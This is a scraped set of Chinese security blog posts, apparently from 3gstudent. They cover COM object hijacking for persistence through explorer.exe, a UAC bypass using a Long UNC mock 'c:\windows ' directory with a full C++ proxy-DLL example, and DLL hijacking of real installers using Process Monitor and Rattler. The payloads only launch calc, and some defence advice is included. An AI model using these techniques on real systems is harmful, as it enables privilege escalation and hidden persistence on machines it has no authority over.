<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1</p>

<p>没有调用Volume Shadow Copy服务，所以不会产生日志文件7036</p>

<h2 id="0x04-小结">0x04 小结</h2>
<hr>

<p>本文整理了多种获得域控服务器NTDS.dit文件的方法，测试使用环境，比较优缺点。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on February 27, 2018
  </div>

  
</article><article class="post">
  <h1>Use COM Object hijacking to maintain persistence——Hijack explorer.exe</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章介绍了两种利用COM对象劫持实现的后门，利用思路有一些区别：</p>

<h3 id="第一种通过clr劫持net程序">第一种，通过CLR劫持.Net程序</h3>

<p><strong>正常CLR的用法：</strong></p>

<p>设置注册表键值HKEY_CURRENT_USER\Software\Classes\CLSID\</p>

<p>cmd下输入：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SET COR_ENABLE_PROFILING=1
SET COR_PROFILER={11111111-1111-1111-1111-111111111111}
</code></pre></div></div>

<p>CLR能够劫持当前cmd下所有.Net程序的启动</p>

<p><strong>后门利用思路：</strong></p>

<p>我尝试通过WMI修改环境变量，使CLR作用于全局，就能够劫持所有.Net程序的启动</p>

<p>经实际测试，该方法有效，系统启动后默认会调用.Net程序，加载CLR，后门触发</p>

<h3 id="第二种劫持caccpropservicesclass和mmdeviceenumerator">第二种，劫持CAccPropServicesClass和MMDeviceEnumerator</h3>

<p>该方法曾被木马COMpfun使用，所以思路也是从COMpfun学到的</p>

<p>设置注册表键值<code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Classes\CLSID\</code>能够指定实例CAccPropServicesClass和MMDeviceEnumerator对应加载的dll</p>

<p>而IE浏览器进程iexplore.exe启动时会调用以上两个实例</p>

<p>所以通过注册表设置CAccPropServicesClass和MMDeviceEnumerator对应加载的dll，能够劫持IE浏览器的启动，实现后门触发</p>

<p>当然，该方法只能算得上是一个被动后门，只有用户启动IE浏览器，才能触发后门</p>

<p>然而，在众多COM对象中，可供利用的劫持对象不唯一，甚至存在能够劫持桌面进程explorer.exe的方法，相当于一个主动后门</p>

<p>例如：劫持MruPidlList</p>

<p><strong>注：</strong></p>

<p>该方法曾被多个已知的恶意软件使用</p>

<p>本着通过研究所有已公开的COM对象后门利用方法，进而总结应对COM劫持防御方法的原则，本文将要介绍另外两种COM劫持的后门利用方法</p>

<p>之前的文章：</p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-maintain-persistence/">《Use CLR to maintain persistence》</a></p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-CAccPropServicesClass-and-MMDeviceEnumerator/">《Use COM Object hijacking to maintain persistence——Hijack CAccPropServicesClass and MMDeviceEnumerator》</a></p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容</p>

<ul>
  <li>通过劫持MruPidlList实现的后门思路</li>
  <li>恶意利用实例</li>
  <li>总结应对COM劫持的防御方法</li>
</ul>

<h2 id="0x02-通过劫持mrupidllist实现的后门思路">0x02 通过劫持MruPidlList实现的后门思路</h2>
<hr>

<p>注册表位置：<code class="language-plaintext highlighter-rouge">HKCU\Software\Classes\CLSID\</code></p>

<p>创建项<code class="language-plaintext highlighter-rouge">{42aedc87-2188-41fd-b9a3-0c966feabec1}</code></p>

<p>创建子项<code class="language-plaintext highlighter-rouge">InprocServer32</code></p>

<p>Default的键值为测试dll的绝对路径：<code class="language-plaintext highlighter-rouge">C:\test\calc.dll</code></p>

<p>创建键值： <code class="language-plaintext highlighter-rouge">ThreadingModel</code> <code class="language-plaintext highlighter-rouge">REG_SZ</code> <code class="language-plaintext highlighter-rouge">Apartment</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-8/2-1.png" alt="Alt text"></p>

<p>该注册表位置对应COM对象MruPidlList，作用于shell32.dll</p>

<p>而shell32.dll是Windows的32位外壳动态链接库文件，用于打开网页和文件，建立文件时的默认文件名的设置等大量功能</p>

<p>直观的理解，explorer.exe会调用shell32.dll，加载COM对象MruPidlList</p>

<p>系统在启动时默认启动进程explorer.exe，如果劫持了COM对象MruPidlList，就能劫持进程explorer.exe，实现后门随系统开机启动，相当于是主动后门</p>

<p>当然，为便于测试，不需要重启系统，结束进程explorer.exe再新建进程explorer.exe就好</p>

<p>新建进程后，加载calc.dll，弹出计算器，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-8/2-2.png" alt="Alt text"></p>

<p>测试64位系统，注册表位置不变，但是需要换用64位dll，重启时后门触发，启动calc.exe，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-8/2-3.png" alt="Alt text"></p>

<p>Win8系统同样适用，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-8/2-4.png" alt="Alt text"></p>

<h2 id="0x03-恶意利用实例">0x03 恶意利用实例</h2>
<hr>

<h3 id="1comrat">1、COMRAT</h3>

<p>怀疑与Uroburos和Agent.BTZ同源</p>

<p>Uroburos：至今发现的最先进rootkit恶意程序之一</p>

<p>Agent.BTZ：一款在2008年用于渗透五角大楼的恶意软件</p>

<p>详细资料：</p>

<p>https://www.nsec.io/wp-content/uploads/2015/05/uroburos-actors-tools-1.1.pdf</p>

<h3 id="2zeroaccess-rootkit">2、ZeroAccess rootkit</h3>

<p>ZeroAccess rootkit：感染过大约900多万台计算机</p>

<p>详细资料：</p>

<p>https://nakedsecurity.sophos.com/2012/06/06/zeroaccess-rootkit-usermode/</p>

<p>https://www.sophos.com/en-us/threat-center/technical-papers/zeroaccess-botnet.aspx</p>

<p><strong>注：</strong></p>

<p>ZeroAccess rootkit还使用过另一个COM劫持的位置</p>

<p>注册表位置：<code class="language-plaintext highlighter-rouge">HKCU\Software\Classes\clsid\{fbeb8a05-beee-4442-804e-409d6c4515e9}</code></p>

<p>利用方法同上，也能够劫持explorer.exe</p>

<h3 id="3bbsrat">3、BBSRAT</h3>

<p>详细资料：</p>

<p>https://researchcenter.paloaltonetworks.com/2015/12/bbsrat-attacks-targeting-russian-organizations-linked-to-roaming-tiger/</p>

<p>http://2014.zeronights.org/assets/files/slides/roaming_tiger_zeronights_2014.pdf</p>

<h2 id="0x04-防御">0x04 防御</h2>
<hr>

<p>由于COM对象是操作系统的正常功能，禁用COM对象不太现实</p>

<p>以下键值指向的dll路径应该特别注意：</p>

<ul>
  <li>HKCU\Software\Classes\CLSID{42aedc87-2188-41fd-b9a3-0c966feabec1}</li>
  <li>HKCU\Software\Classes\CLSID{fbeb8a05-beee-4442-804e-409d6c4515e9}</li>
  <li>HKCU\Software\Classes\CLSID{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}</li>
  <li>HKCU\Software\Classes\Wow6432Node\CLSID{BCDE0395-E52F-467C-8E3D-C4579291692E}</li>
</ul>

<h3 id="防御方法">防御方法：</h3>

<p>1、使用应用程序白名单规则，禁止加载第三方dll</p>

<p>2、对注册表<code class="language-plaintext highlighter-rouge">HKCU\Software\Classes\CLSID\</code>的写入和修改操作进行记录并调查</p>

<p>更多关于COM对象劫持的资料可参考：</p>

<p>https://attack.mitre.org/wiki/Technique/T1122</p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文介绍了两种利用COM劫持实现的后门方法，结合之前文章的两种利用方法，综合分析COM劫持的防御方法。
特别值得注意的是，COM劫持后门能够绕过Autoruns对启动项的检测，实际防御时应该注意该细节。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on August  8, 2017
  </div>

  
</article><article class="post">
  <h1>通过模拟可信目录绕过UAC的利用分析</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>从@CE2Wells的博客学到的一个技巧，通过模拟可信目录能够绕过UAC，本文将对结合自己的经验对这个方法进行介绍，添加自己的理解，分享测试中的细节</p>

<p>文章地址：</p>

<p>https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<ul>
  <li>原理介绍</li>
  <li>实现细节</li>
  <li>实际测试</li>
  <li>利用分析</li>
</ul>

<h2 id="0x02-原理介绍">0x02 原理介绍</h2>
<hr>

<h3 id="1long-unc">1、Long UNC</h3>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Catalog%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0-Long-UNC%E6%96%87%E4%BB%B6%E5%90%8D%E6%AC%BA%E9%AA%97/">《Catalog签名伪造——Long UNC文件名欺骗》</a>曾介绍过exe文件使用Long UNC后能够欺骗系统，将其识别为另一个文件</p>

<p>例如：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>type putty.exe &gt; "\\?\C:\Windows\System32\calc.exe "
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-8/2-0.png" alt="Alt text"></p>

<p>这个方法同样适用于文件夹</p>

<p>例如：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>md "\\?\c:\windows "
</code></pre></div></div>

<p>新创建的文件夹能够欺骗系统，将其识别为另一个文件夹</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-8/2-1.png" alt="Alt text"></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-8/2-2.png" alt="Alt text"></p>

<h3 id="2默认能够绕过uac的文件">2、默认能够绕过UAC的文件</h3>

<p>需要满足以下三个条件：</p>

<ul>
  <li>程序配置为自动提升权限，以管理员权限执行</li>
  <li>程序包含签名</li>
  <li>从受信任的目录(<code class="language-plaintext highlighter-rouge">"c:\windows\system32"</code>)执行</li>
</ul>

<h3 id="3普通用户权限能够在磁盘根目录创建文件夹">3、普通用户权限能够在磁盘根目录创建文件夹</h3>

<p>例如，普通用户权限能够在c盘下创建文件夹</p>

<h3 id="4dll劫持">4、dll劫持</h3>

<p>exe程序如果在启动过程中需要加载dll，默认先搜索exe程序的同级目录</p>

<p>综上，满足了绕过UAC的所有条件</p>

<p>实现的思路如下：</p>

<ol>
  <li>找到一个默认能够绕过UAC的文件，例如<code class="language-plaintext highlighter-rouge">c:\windows\system32\winsat.exe</code></li>
  <li>使用Long UNC创建一个特殊的文件夹<code class="language-plaintext highlighter-rouge">"c:\windows \"</code>，并将winsat.exe复制到该目录</li>
  <li>执行winsat.exe，记录启动过程，发现启动时需要加载同级目录下的WINMM.dll</li>
  <li>编写payload.dll，指定导出函数同<code class="language-plaintext highlighter-rouge">c:\windows\system32\winmm.dll</code>相同，并命名为<code class="language-plaintext highlighter-rouge">"c:\windows \system32\WINMM.dll"</code></li>
  <li>执行<code class="language-plaintext highlighter-rouge">"c:\windows \system32\winsat.exe"</code>，将自动绕过UAC，加载<code class="language-plaintext highlighter-rouge">"c:\windows \system32\WINMM.dll"</code>，执行payload</li>
</ol>

<h2 id="0x03-实现细节">0x03 实现细节</h2>
<hr>

<h3 id="1寻找可供利用的exe">1、寻找可供利用的exe</h3>

<p>这些文件的特征之一是manifest中的autoElevate属性为true</p>

<p>可以借助powershell实现自动化搜索，参考工具：</p>

<p>https://github.com/g3rzi/Manifesto</p>

<p>界面化的工具使用如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-8/2-3.png" alt="Alt text"></p>

<h3 id="2使用long-unc创建一个特殊的文件夹cwindows-">2、使用Long UNC创建一个特殊的文件夹<code class="language-plaintext highlighter-rouge">"c:\windows \"</code></h3>

<p>C++的实现代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CreateDirectoryW(L"\\\\?\\C:\\Windows \\", 0);
</code></pre></div></div>

<p>通过命令行实现的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>md "\\?\c:\windows "
</code></pre></div></div>

<h3 id="3记录winsatexe的启动过程寻找启动时加载的dll">3、记录winsat.exe的启动过程，寻找启动时加载的dll</h3>

<p>这里可以使用Process Monitor，筛选出启动过程中结果为”NAME NOT FOUND”的记录，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-8/2-4.png" alt="Alt text"></p>

<p>因此，可供利用的dll名称如下：</p>

<ul>
  <li>VERSION.dll</li>
  <li>WINMM.dll</li>
  <li>POWRPROF.dll</li>
  <li>dxgi.dll</li>
  <li>dwmapi.dll</li>
  <li>d3d10_1.dll</li>
  <li>d3d1-_1core.dll</li>
  <li>d3d11.dll</li>
  <li>d3d10core.dll</li>
  <li>QUARTZ.dll</li>
</ul>

<p>任选一个即可</p>

<h3 id="4编写payloaddll指定导出函数">4、编写payload.dll，指定导出函数</h3>

<p>这里可以使用exportstoc，下载地址：</p>

<p>https://github.com/michaellandi/exportstoc</p>

<p>详细使用说明可参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-Weekly-No.1(Monitor-WMI_ExportsToC++_Use-DiskCleanup-bypass-UAC)/">《Study Notes Weekly No.1(Monitor WMI &amp; ExportsToC++ &amp; Use DiskCleanup bypass UAC)》</a></p>

<p>例如这里选择<code class="language-plaintext highlighter-rouge">VERSION.dll</code>，劫持的原dll路径为<code class="language-plaintext highlighter-rouge">c:\\Windows\\system32\\version.dll</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-8/2-5.png" alt="Alt text"></p>

<p>添加payload为启动计算器，最终的代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include "stdafx.h"
#include &lt;iostream&gt;
#include &lt;windows.h&gt;

using namespace std;

#pragma comment (linker, "/export:GetFileVersionInfoA=c:\\windows\\system32\\version.GetFileVersionInfoA,@1")
#pragma comment (linker, "/export:GetFileVersionInfoByHandle=c:\\windows\\system32\\version.GetFileVersionInfoByHandle,@2")
#pragma comment (linker, "/export:GetFileVersionInfoExW=c:\\windows\\system32\\version.GetFileVersionInfoExW,@3")
#pragma comment (linker, "/export:GetFileVersionInfoSizeA=c:\\windows\\system32\\version.GetFileVersionInfoSizeA,@4")
#pragma comment (linker, "/export:GetFileVersionInfoSizeExW=c:\\windows\\system32\\version.GetFileVersionInfoSizeExW,@5")
#pragma comment (linker, "/export:GetFileVersionInfoSizeW=c:\\windows\\system32\\version.GetFileVersionInfoSizeW,@6")
#pragma comment (linker, "/export:GetFileVersionInfoW=c:\\windows\\system32\\version.GetFileVersionInfoW,@7")
#pragma comment (linker, "/export:VerFindFileA=c:\\windows\\system32\\version.VerFindFileA,@8")
#pragma comment (linker, "/export:VerFindFileW=c:\\windows\\system32\\version.VerFindFileW,@9")
#pragma comment (linker, "/export:VerInstallFileA=c:\\windows\\system32\\version.VerInstallFileA,@10")
#pragma comment (linker, "/export:VerInstallFileW=c:\\windows\\system32\\version.VerInstallFileW,@11")
#pragma comment (linker, "/export:VerLanguageNameA=c:\\windows\\system32\\version.VerLanguageNameA,@12")
#pragma comment (linker, "/export:VerLanguageNameW=c:\\windows\\system32\\version.VerLanguageNameW,@13")
#pragma comment (linker, "/export:VerQueryValueA=c:\\windows\\system32\\version.VerQueryValueA,@14")
#pragma comment (linker, "/export:VerQueryValueW=c:\\windows\\system32\\version.VerQueryValueW,@15")

BOOL WINAPI DllMain(HINSTANCE hInst,DWORD reason,LPVOID)
{
	system("start calc.exe");
	return true;
}
</code></pre></div></div>

<p>将其编译成dll，另存为<code class="language-plaintext highlighter-rouge">"c:\windows \system32\VERSION.dll"</code>，</p>

<h3 id="5启动exe">5、启动exe</h3>

<p>命令行下启动需要绝对路径：<code class="language-plaintext highlighter-rouge">"c:\windows \system32\winsat.exe"</code></p>

<p><strong>注：</strong></p>

<p>这里不可以使用短文件名(短文件名通过<code class="language-plaintext highlighter-rouge">"dir /x"</code>获得）</p>

<h2 id="0x04-利用分析">0x04 利用分析</h2>
<hr>

<p>1、可供利用的位置不唯一</p>

<p>在我的测试系统(Win7 x64)中,可供利用的exe有39个，可供利用的dll也有很多</p>

<p>2、对于Long UNC这种文件夹还有其他形式</p>

<p>例如：</p>

<ul>
  <li>文件名可以包含多个空格： <code class="language-plaintext highlighter-rouge">"\\?\C:\Windows    "</code></li>
  <li>使用字符<code class="language-plaintext highlighter-rouge">"."</code>(最少两个)： <code class="language-plaintext highlighter-rouge">"\\?\C:\Windows.."</code></li>
</ul>

<p>但其他形式的文件夹无法用来绕过UAC</p>

<p>3、使用Long UNC创建伪造的文件夹能够欺骗“粗心的管理员”</p>

<p>例如系统开启<code class="language-plaintext highlighter-rouge">Windows command line process auditing</code>，记录程序运行的参数</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-8/3-1.png" alt="Alt text"></p>

<p>肉眼很难分辨</p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文对通过模拟可信目录绕过UAC的方法进行分析，分享测试中的细节</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on February  8, 2019
  </div>

  
</article><article class="post">
  <h1>DLL劫持漏洞自动化识别工具Rattler测试</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>最近，来自SensePost的Chris Le Roy开源了一款工具：<code class="language-plaintext highlighter-rouge">Rattler</code>，可用来自动识别DLL是否存在预加载漏洞(也可以理解为DLL劫持漏洞，文中该名词均采用DLL劫持漏洞)。虽然DLL劫持漏洞已不再是新技术，可追溯到2010年，但是我对自动化很是感兴趣，于是对此做了进一步研究。</p>

<p>本文将理清DLL劫持漏洞原理，实例分析，测试自动化工具Rattler，分享心得，并测试一个存在该漏洞的软件——Explorer Suite安装包</p>

<p><strong>注：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Explorer Suite安装包内包含CFF Explorer，免费，常用来编辑PE文件格式，最后更新于2012年11月18日，是比较小众的一款工具。
对于分析PE文件格式，建议使用作者另一款更专业的工具：Cerbero Profiler
</code></pre></div></div>

<hr>

<p>Chris Le Roy介绍Rattler的博客地址：</p>

<p>https://sensepost.com/blog/2016/rattleridentifying-and-exploiting-dll-preloading-vulnerabilities/</p>

<p>Chris Le Roy在BSides Cape Town上也介绍了Rattler，简介如下：</p>

<p>http://www.bsidescapetown.co.za/speaker/chris-le-roy/</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<h3 id="dll劫持漏洞根源">DLL劫持漏洞根源</h3>

<p>程序在调用DLL时未指明DLL的完整路径</p>

<h3 id="safedllsearchmode">SafeDllSearchMode</h3>

<p>从WindowsXPSP2开始，SafeDllSearchMode默认开启，SafeDllSearchMode的存在是为了阻止在XP时代存在的DLL劫持漏洞</p>

<p><strong>注：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>强制关闭SafeDllSearchMode的方法：

创建注册表项
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode
值设为0 
</code></pre></div></div>

<p>程序在调用DLL时，如果未指明DLL的完整路径，那么系统会按照一套固定的搜索顺序寻找DLL</p>

<p>如果SafeDllSearchMode开启，程序会依次从以下位置查找DLL文件：</p>

<p>The directory from which the application loaded</p>

<p>The system directory</p>

<p>The 16-bit system directory</p>

<p>The Windows directory</p>

<p>The current directory</p>

<p>The directories that are listed in the PATH environment variable</p>

<p>如果关闭，则从以下位置查找DLL文件：</p>

<p>The directory from which the application loaded</p>

<p>The current directory</p>

<p>The system directory</p>

<p>The 16-bit system directory</p>

<p>The Windows directory</p>

<p>The directories that are listed in the PATH environment variable</p>

<p>详细内容见：</p>

<p>https://msdn.microsoft.com/en-us/library/ms682586(VS.85).aspx</p>

<h3 id="knowndlls">KnownDLLs</h3>

<p>注册表位置：</p>

<p><code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</code></p>

<p>KnownDLLs注册表项下包含一系列常见的系统dll，如usp10.dll、lpk.dll、shell32.dll、user32.dll</p>

<p><strong>注：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>如果创建注册表项
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\ExcludeFromKnownDlls
并指定具体dll名称，可以使KnownDLLs列表中同名的dll保护失效
修改后需要重启才能生效
</code></pre></div></div>

<h3 id="safedllsearchmodeknowndlls">SafeDllSearchMode+KnownDLLs</h3>

<p>二者结合可用来防范对系统dll的劫持</p>

<p><strong>注：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>系统dll是指排除ExcludeFromKnownDlls项后，KnownDLLs注册表项下包含的dll列表
</code></pre></div></div>

<p>如果调用的dll“不常见”，也就是并未出现在KnownDLLs的列表中，那么无论SafeDllSearchMode是否开启，dll搜索的第一顺序均为程序的当前目录，这里就存在一个DLL劫持漏洞：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>在程序同级目录下预先放置一个同名的dll，在进程启动的过程中会优先加载，实现劫持
</code></pre></div></div>

<p><strong>注：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>这里提到的DLL劫持漏洞微软尚未给出直接的修复方法，个人认为原因有以下几点：

1. 这是开发者的失误，换用绝对路径就能避免这个问题
2. 利用的前提是攻击者已经能够在同级目录放置文件，这代表系统已经被攻破
3. 如果直接修复，或许会影响老版本程序，兼容性不好
</code></pre></div></div>

<p><strong>注：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>该文章对理清上述顺序起到很大帮助：
http://www.freebuf.com/articles/78807.html
</code></pre></div></div>

<h2 id="0x02-利用实例">0x02 利用实例</h2>
<hr>

<p>接下来编写一个存在DLL劫持漏洞的实例，演示如何利用</p>

<p>测试dll：</p>

<p>使用dll模板，具体代码略，加载成功后弹出计算器</p>

<p>测试程序的c++代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include "stdafx.h"
#include &lt;windows.h&gt; 

int main()
{
	HMODULE hDllLib = LoadLibrary(_T("Kernel32.dll"));
	if (hDllLib)
	{
		FARPROC fpFun = GetProcAddress(hDllLib, "GetVersion");
		DWORD dwVersion = (*fpFun)();
		DWORD dwWindowsMajorVersion = (DWORD)(LOBYTE(LOWORD(dwVersion)));
		DWORD dwWindowsMinorVersion = (DWORD)(HIBYTE(LOWORD(dwVersion)));
		printf("version:%d,%d \n", dwWindowsMajorVersion, dwWindowsMinorVersion);	
		FreeLibrary(hDllLib);
	}
	HMODULE hDllLib2 = LoadLibrary(_T("CRYPTSP.dll"));
	FreeLibrary(hDllLib2);
	return 0;
}
</code></pre></div></div>

<p>程序通过LoadLibrary分别调用<code class="language-plaintext highlighter-rouge">Kernel32.dll</code>和<code class="language-plaintext highlighter-rouge">CRYPTSP.dll</code></p>

<p><strong>实际测试：</strong></p>

<p>将测试dll重命名为Kernel32.dll，并放于程序同级目录下，运行如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-7/1-1.png" alt="Alt text"></p>

<p>由于Kernel32.dll出现在KnownDLLs的列表中，所以在程序同级目录下的Kernel32.dll并不会被加载</p>

<p>然后将测试dll重命名为CRYPTSP.dll，并放于程序同级目录下，运行如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-7/1-2.png" alt="Alt text"></p>

<p>由于CRYPTSP.dll并未在KnownDLLs的列表中，所以在程序同级目录下的CRYPTSP.dll被加载，成功弹出计算器</p>

<h2 id="0x03-实际利用">0x03 实际利用</h2>
<hr>

<p>本节通过实例介绍如何使用Process Monitor查找程序中存在的DLL劫持漏洞，测试实例为Chris Le Roy在介绍Rattler的博客中提到过的<code class="language-plaintext highlighter-rouge">NDP461-KB3102438-Web.exe</code></p>

<p>博客地址如下：</p>

<p>https://sensepost.com/blog/2016/rattleridentifying-and-exploiting-dll-preloading-vulnerabilities/</p>

<p>NDP461-KB3102438-Web.exe的下载地址：</p>

<p>http://www.microsoft.com/zh-cn/download/details.aspx?id=49981&amp;134b2bb0-86c1-fe9f-d523-281faef41695=1&amp;fa43d42b-25b5-4a42-fe9b-1634f450f5ee=True</p>

<p>使用Process Monitor做如下设置：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Include the following filters:
Operation is CreateFile
Operation is LoadImage
Path contains .cpl
Path contains .dll
Path contains .drv
Path contains .exe
Path contains .ocx
Path contains .scr
Path contains .sys

Exclude the following filters:
Process Name is procmon.exe
Process Name is Procmon64.exe
Process Name is System
Operation begins with IRP_MJ_
Operation begins with FASTIO_
Result is SUCCESS
Path ends with pagefile.sys
</code></pre></div></div>

<p>参考地址：</p>

<p>https://msdn.microsoft.com/library/ff919712</p>

<p><strong>注：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>设置Exclude Result is SUCCESS后会只显示NAME NOT FOUND项，也就是只查看未成功加载的dll项，即KnownDLLs的列表中不包含的dll名称，可用于查找存在漏洞的dll路径
</code></pre></div></div>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-7/2-1.png" alt="Alt text"></p>

<p>启动NDP461-KB3102438-Web.exe后，查看Process Monitor，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-7/2-2.png" alt="Alt text"></p>

<p>可以看到<code class="language-plaintext highlighter-rouge">NDP461-KB3102438-Web.exe</code>在启动的过程中会加载<code class="language-plaintext highlighter-rouge">CRYPTSP.dll</code>，同时显示<code class="language-plaintext highlighter-rouge">NAME NOT FOUND</code>，表示无法找到该文件，加载失败</p>

<p>现在将测试dll重命名为<code class="language-plaintext highlighter-rouge">CRYPTSP.dll</code>，并放于NDP461-KB3102438-Web.exe的同级目录下</p>

<p>打开Process Monitor，设置Filter，去掉Exclude Result is SUCCESS项，再次启动NDP461-KB3102438-Web.exe并记录</p>

<p>如下图，显示<code class="language-plaintext highlighter-rouge">C:\test\CRYPTSP.dll</code>已被成功加载，Result为Success，DLL劫持成功</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-7/2-4.png" alt="Alt text"></p>

<p>如下图，程序在执行过程中成功弹出计算器</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-7/2-3.png" alt="Alt text"></p>

<h2 id="0x04-程序自动化实现">0x04 程序自动化实现</h2>
<hr>

<p>通过Process Monitor查看DLL劫持漏洞是比较直接的方法，但是对于较大的程序，加载的DLL数目很多，手动查找很不现实，费事费力，所以如果能够通过程序实现上述过程，自动查找并利用，就可以大大提高效率，这就是Rattler所解决的问题</p>

<p>项目地址：</p>

<p>https://github.com/sensepost/rattler</p>

<p><strong>思路：</strong></p>

<ul>
  <li>
    <p>枚举进程调用的dll列表，解析出dll的名称</p>
  </li>
  <li>
    <p>将测试dll分别重命名为列表中的dll名称</p>
  </li>
  <li>
    <p>再次启动程序，检测是否成功创建进程calc.exe,如果成功，代表存在漏洞，否则不存在</p>
  </li>
</ul>

<p><strong>实际测试：</strong></p>

<p>使用Visual Studio编译Rattler</p>

<p>将payload.dll放于同级目录下</p>

<p>payload.dll下载地址：</p>

<p>https://github.com/sensepost/rattler/releases/download/v1.0/payload.dll</p>

<p>管理员权限的cmd下运行命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Rattler.exe NDP461-KB3102438-Web.exe 1
</code></pre></div></div>

<p><strong>注：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>因为NDP461-KB3102438-Web.exe需要管理员权限运行，所以cmd也需要管理员权限
</code></pre></div></div>

<p>如下图，自动找到存在预加载漏洞的dll列表</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-7/2-5.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>在反复启动进程的过程中，calc.exe没有正常被关闭，所以得出的结果要多于实际结果
</code></pre></div></div>

<p><strong>补充：</strong></p>

<p>下载的NDP461-KB3102438-Web.exe通常位于Downloads文件夹下，所以只要在该目录预先放置CRYPTSP.dll，那么在用户下载运行NDP461-KB3102438-Web.exe的过程中，就能够实现加载CRYPTSP.dll</p>

<p>同时，安装NDP461-KB3102438-Web.exe需要管理员权限，那么此时CRYPTSP.dll也获得了管理员权限</p>

<h2 id="0x05-验证测试">0x05 验证测试</h2>
<hr>

<p>掌握该方法后，测试其他程序，例如CFF Explorer的安装包<code class="language-plaintext highlighter-rouge">Explorer Suite</code></p>

<p>下载地址：
http://www.ntcore.com/exsuite.php</p>

<p>同样借助Process Monitor查看CFF Explorer的安装包ExplorerSuite.exe在启动过程中的操作</p>

<p>如图，找到ExplorerSuite.exe在启动过程中加载的dll列表</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-7/3-1.png" alt="Alt text"></p>

<p>经实际测试，将payload.dll重命名为apphelp.dll或者dwmapi.dll均能够触发payload，弹出计算器</p>

